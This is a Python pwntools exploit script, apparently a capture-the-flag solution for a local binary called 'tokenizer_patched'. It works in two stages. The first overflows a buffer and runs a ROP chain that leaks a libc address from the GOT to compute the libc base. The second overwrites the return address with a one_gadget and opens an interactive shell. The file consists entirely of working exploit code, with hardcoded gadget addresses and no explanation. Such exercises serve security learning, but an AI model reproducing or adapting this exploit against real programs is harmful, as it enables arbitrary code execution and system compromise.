from pwn import *

libc = ELF('./libc-2.27.so')
exe = ELF('./tokenizer_patched')
# context.log_level = 'debug'

##############################################################
### Stage 1: Leak address and calculate one_gadget address ###
##############################################################
LSB1 = 0xf0						# So that we have more space
pop_rdi_ret = 0x000000000040149b			# ROPgadget
pop_rsi_r15_ret = 0x0000000000401499			# ROPgadget
cout = 0x0000000000404020				# readelf -r
strsep_got = 0x0000000000403f98				# readelf -r
basic_ostream_plt = 0x0000000000401080			# gdb
return_addr = 0x000000000040133c			# gdb
one_gadget_offset = 0x00000000004f322
strsep_offset = libc.symbols['strsep']

inp_str1 = b'A'*(1024 - LSB1 + 0x20)			# Padding
inp_str1 += b'BBBBBBBB'					# Fake rbp
inp_str1 += p64(pop_rdi_ret)
inp_str1 += p64(cout)
inp_str1 += p64(pop_rsi_r15_ret)
inp_str1 += p64(strsep_got)
inp_str1 += b'15151515'
inp_str1 += p64(basic_ostream_plt)
inp_str1 += p64(return_addr)
inp_str1 = inp_str1.ljust(1024, b'\x00')		# Padding
inp_str1 = inp_str1.replace(b'\x00', p8(LSB1))		# Replace '\x00'
delim1 = p8(LSB1)

while True:
	p = process('./tokenizer_patched')
	p.recvuntil(b'characters):')
	p.sendline(inp_str1)
	data = p.recvuntil(b'delimiters:')
	data = u64(data.split(b'truncated: ')[1][1024:1024+6] + b'\x00'*2)
	print(hex(data))
	if (hex(data)[-2:]==hex(LSB1)[-2:]):
		break
	p.close()

p.sendline(delim1)
leak_addr = u64(p.recvuntil(b'1024 characters):').split(b'Welcome to')[0][-6:] + b'\x00\x00')
print('[+] Leak address:', hex(leak_addr))
libc_base = leak_addr - strsep_offset
print('[*] Libc base:', hex(libc_base))
one_gadget_addr = libc_base + one_gadget_offset
print('[*] One gadget:', hex(one_gadget_addr))

###############################################	
### Stage 2: Pass one_gadget to spawn shell ###
###############################################
LSB2 = 0x38
inp_str2 = b'A'*1000 							# Padding
inp_str2 += b'BBBBBBBB'							# Fake rbp
inp_str2 += p64(one_gadget_addr)					# one_gadget at rip
inp_str2 = inp_str2.ljust(1024, b'\x00')				# Padding
inp_str2 = inp_str2.replace(b'\x00', p8(LSB2))				# Replace '\x00'
delim2 = p8(LSB2)

p.sendline(inp_str2)
p.recvuntil(b'delimiters:')
p.sendline(delim2)
p.recvline()
p.recvline()
p.recvline()
p.interactive()